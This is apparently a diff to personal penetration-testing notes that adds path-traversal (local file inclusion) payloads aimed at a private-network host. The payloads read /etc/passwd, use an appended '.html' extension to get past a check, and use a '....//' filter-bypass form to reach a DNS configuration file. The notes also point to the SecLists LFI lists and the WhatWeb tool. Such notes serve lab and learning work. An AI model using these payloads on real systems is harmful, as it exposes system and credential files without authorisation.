@@ -18,10 +18,12 @@ ___
 
 
 `http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd
-
-if that doesn't work try
-
+if that doesn't work try adding an allowed extension:
 `http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html
+Or try different syntax like:
+`GET /download?file=....//....//...//....//....//etc/bind/named.conf`
+
+seclist has lists of lfi's that can be used.
 
 ### whatweb can identify web severs and get common directories
 https://github.com/urbanadventurer/WhatWeb
